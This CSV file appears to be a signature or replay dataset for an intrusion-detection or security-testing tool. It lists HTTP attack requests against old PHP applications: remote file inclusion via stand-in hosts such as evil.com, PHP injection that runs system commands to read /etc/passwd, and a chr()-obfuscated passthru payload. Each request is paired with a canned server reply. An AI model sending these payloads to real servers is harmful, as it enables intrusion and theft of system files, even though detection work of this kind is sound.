XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
foing_cmi_a.xml,Foing 0.7.0 (phpBB) Remote File Inclusion Vulnerability,"This threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via index.phps ""phpbb_root_path"" parameter. Foing is a web based application with typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿foing_cmi_b.xml,Foing 0.7.0 (phpBB) Remote File Inclusion Vulnerability,"This threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via song.phps ""phpbb_root_path"" parameter. Foing is a web based application with typically listens on port 80.",HTTP,TCP,"GET /foing/song.php?phpbb_root_path=http||3A ||//evilcode.txt?&cmd=uname%20-a HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
foing_cmi_b.xml,Foing 0.7.0 (phpBB) Remote File Inclusion Vulnerability,"This threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via song.phps ""phpbb_root_path"" parameter. Foing is a web based application with typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿foing_cmi_c.xml,Foing 0.7.0 (phpBB) Remote File Inclusion Vulnerability,"This threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via faq.phps ""phpbb_root_path"" parameter. Foing is a web based application with typically listens on port 80.",HTTP,TCP,"GET /foing/faq.php?phpbb_root_path=http||3A ||//evilcode.txt?&cmd=uname%20-a HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
foing_cmi_c.xml,Foing 0.7.0 (phpBB) Remote File Inclusion Vulnerability,"This threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via faq.phps ""phpbb_root_path"" parameter. Foing is a web based application with typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿foing_cmi_d.xml,Foing 0.7.0 (phpBB) Remote File Inclusion Vulnerability,"This threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via list.phps ""phpbb_root_path"" parameter. Foing is a web based application with typically listens on port 80.",HTTP,TCP,"GET /foing/list.php?phpbb_root_path=http||3A ||//evilcode.txt?&cmd=uname%20-a HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
foing_cmi_d.xml,Foing 0.7.0 (phpBB) Remote File Inclusion Vulnerability,"This threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via list.phps ""phpbb_root_path"" parameter. Foing is a web based application with typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿foing_cmi_e.xml,Foing 0.7.0 (phpBB) Remote File Inclusion Vulnerability,"This threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via gen_m3u.phps ""phpbb_root_path"" parameter. Foing is a web based application with typically listens on port 80.",HTTP,TCP,"GET /foing/gen_m3u.php?phpbb_root_path=http||3A ||//evilcode.txt?&cmd=uname%20-a HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
foing_cmi_e.xml,Foing 0.7.0 (phpBB) Remote File Inclusion Vulnerability,"This threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via gen_m3u.phps ""phpbb_root_path"" parameter. Foing is a web based application with typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿foing_cmi_f.xml,Foing 0.7.0 (phpBB) Remote File Inclusion Vulnerability,"This threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via playlist.phps ""phpbb_root_path"" parameter. Foing is a web based application with typically listens on port 80.",HTTP,TCP,"GET /foing/playlist.php?phpbb_root_path=http||3A ||//evilcode.txt?&cmd=uname%20-a HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
foing_cmi_f.xml,Foing 0.7.0 (phpBB) Remote File Inclusion Vulnerability,"This threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via playlist.phps ""phpbb_root_path"" parameter. Foing is a web based application with typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿googleapp_cmi.xml,Google Appliance ProxyStyleSheet Command Execution,This threat sends a crafted HTTP Request with with a modified URL string containing a URL path to a remote file that can be executed. The google search appliance is an application running on a hardware appliance that typically listens on port 80.,HTTP,TCP,GET /search?client=test&site=test&output=xml_no_dtd&proxystylesheet=http||3A ||//threathost.com||3A ||8080/KhXrqs.xsl&q=MB9NL5Iasxt6Li6BbMfKbWxbIji&proxyreload=1 HTTP/1.0||0D 0A 0D 0A||
googleapp_cmi.xml,Google Appliance ProxyStyleSheet Command Execution,This threat sends a crafted HTTP Request with with a modified URL string containing a URL path to a remote file that can be executed. The google search appliance is an application running on a hardware appliance that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿hivemail_cmi_a.xml,HiveMail Vulnerabilities Remote Command Execution,This threat sends a crafted URL containing PHP code which is executed by the server. HiveMail is a web based application which typically listens on port 80.,HTTP,TCP,"GET /addressbook.update.php?cmd=remove&contactgroupid=1%20--%20||22 3B ||phpinfo()||3B ||@ob_start(||22 ||&submit=1&contactcheck[]=1&con HTTP/1.0||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A 0D 0A||"
hivemail_cmi_a.xml,HiveMail Vulnerabilities Remote Command Execution,This threat sends a crafted URL containing PHP code which is executed by the server. HiveMail is a web based application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿hivemail_cmi_b.xml,HiveMail Vulnerabilities Remote Command Execution,This threat sends a crafted URL containing PHP code which is executed by the server. HiveMail is a web based application which typically listens on port 80.,HTTP,TCP,"GET /addressbook.add.php?cmd=quick&messageid=1||22 ||)||3B ||phpinfo()||3B ||@ob_start(||22 ||&popid=1&msgid=1 HTTP/1.0||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A 0D 0A||"
hivemail_cmi_b.xml,HiveMail Vulnerabilities Remote Command Execution,This threat sends a crafted URL containing PHP code which is executed by the server. HiveMail is a web based application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿hivemail_cmi_c.xml,HiveMail Vulnerabilities Remote Command Execution,This threat sends a crafted URL containing PHP code which is executed by the server. HiveMail is a web based application which typically listens on port 80.,HTTP,TCP,"GET /folders.update.php?cmd=mark&folderid=0%20--%20%22)||3B ||phpinfo()||3B ||@ob_start(%22 HTTP/1.0||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A 0D 0A||"
hivemail_cmi_c.xml,HiveMail Vulnerabilities Remote Command Execution,This threat sends a crafted URL containing PHP code which is executed by the server. HiveMail is a web based application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿hivemail_cmi_d.xml,HiveMail 1.3 remote command execution exploit,"This threat send a crafted HTTP GET query which allows the crafted URL to insert PHP code, this is then executed by the server via the ""cmd"" parameter. HiveMail is a web application with typically listens on port 80.",HTTP,TCP,"GET /hivemail/addressbook.add.php?hivesession=22ead72ecf6af376a801923466a23efa&cmd=quick&messageid=%22)||3B ||echo%20%22start_er%22||3B ||system($com)||3B ||echo%20%22end_er%22||3B ||@d(%22&popid=1&com=cat%20/etc/passwd HTTP/1.1||0D 0A ||TE||3A || deflate,gzip||3B ||q=0.3||0D 0A ||Connection||3A || TE, close||0D 0A ||Host||3A || 127.0.0.1||0D 0A ||User-Agent||3A || libwww-perl/5.803||0D 0A 0D 0A||"
hivemail_cmi_d.xml,HiveMail 1.3 remote command execution exploit,"This threat send a crafted HTTP GET query which allows the crafted URL to insert PHP code, this is then executed by the server via the ""cmd"" parameter. HiveMail is a web application with typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿horde_cmi.xml,Horde help viewer module remote PHP code execution,This threat sends a crafted HTTP query containing an SQL statement which when executed by the server allows the injection of PHP code which will also be executed by the server when the inserted record is displayed.,HTTP,TCP,GET /horde/services/help/?show=about&module=||3B 22 ||.passthru(chr(101).chr(99).chr(104).chr(111).chr(32).chr(95).chr(99).chr(109).chr(100).chr(95).chr(98).chr(101).chr(103).chr(95).chr(59).chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100).chr(59).chr(101).chr(99).chr(104).chr(111).chr(32).chr(95).chr(99).chr(109).chr(100).chr(95).chr(101).chr(110).chr(100).chr(95))||3B ||'. HTTP/1.1||0D 0A ||Host||3A || 216.239.37.104||3A ||80||0D 0A ||Content-Type||3A || application/html||0D 0A ||Content-Length||3A || 417||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
horde_cmi.xml,Horde help viewer module remote PHP code execution,This threat sends a crafted HTTP query containing an SQL statement which when executed by the server allows the injection of PHP code which will also be executed by the server when the inserted record is displayed.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿iprimal_cmi.xml,IPrimal Forums Index.PHP Authentication Bypass Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.iPrimal Forums is a web application that typically listens on port 80.,HTTP,TCP,POST /script/admin/index.php?p=members&edit=admin HTTP/1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||Content-Type||3A || application/x-www-form-urlencoded||0D 0A ||Content-Length||3A || 373||0D 0A 0D 0A ||usersname=admin&password=passwd&email=test%40test.com&name=Dummy+user&tagline=Im+a+dumy+user&location=Ohio&bday=1983-11-20&j$||0D 0A||
iprimal_cmi.xml,IPrimal Forums Index.PHP Authentication Bypass Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.iPrimal Forums is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿loudblog_cmi.xml,Loudblog backend_settings.php GLOBALS[path] Variable Remote File Inclusion,This threat sends a crafted URL that contains a command which is executed by the server. Loudblog is a we based application that typically listens on port 80.,HTTP,TCP,POST /loudblog/loudblog/inc/backend_settings.php?cmd=cat+.%2F..%2Fconfig.php&GLOBALS[path]=http||3A ||//www.gooogle.com HTTP/1.1||0D 0A ||Content-Type||3A || multipart/form-data||3B || boundary=---------------------------7d529a1d23092a||0D 0A ||Host||3A || www.stonedcoder.org||0D 0A ||User-Agent||3A || Googlebot 2.1||0D 0A ||Content-Length||3A || 166||0D 0A ||Connection||3A || Close||0D 0A 0D 0A ||-----------------------------7d529a1d23092a||0D 0A ||Content-Disposition||3A || form-data||3B || name=||22 ||language||22 0D 0A ||Content-Type||3A 0D 0A 0D 0A ||suntzu||0D 0A ||-----------------------------7d529a1d23092a--
loudblog_cmi.xml,Loudblog backend_settings.php GLOBALS[path] Variable Remote File Inclusion,This threat sends a crafted URL that contains a command which is executed by the server. Loudblog is a we based application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿mediagallery_geeklog_cmi.xml,Media Gallery for Geeklog <= 1.4.8a Remote File Inclusion Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. Media Gallery for Geeklog is a web application that typically listens on port 80.,HTTP,TCP,GET /mediagallery/public_html/maint/ftpmedia.php?_MG_CONF[path_html]=http||3A ||//www.evil.com/cmd.txt? HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
